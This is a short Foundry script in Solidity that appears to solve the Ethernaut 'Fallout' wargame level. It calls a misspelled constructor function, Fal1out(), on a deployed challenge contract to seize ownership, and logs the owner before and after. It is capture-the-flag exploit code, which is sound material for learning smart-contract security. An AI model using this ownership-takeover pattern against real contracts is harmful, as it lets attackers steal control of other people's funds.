// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FalloutSolution is Script {

    Fallout public falloutInstance = Fallout(0x17196B6d98a1CF2e43dee7bAd44B026dA7787258);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Owner before: ", falloutInstance.owner());
        falloutInstance.Fal1out();
        console.log("Owner after: ", falloutInstance.owner());
        
        vm.stopBroadcast();
    }
}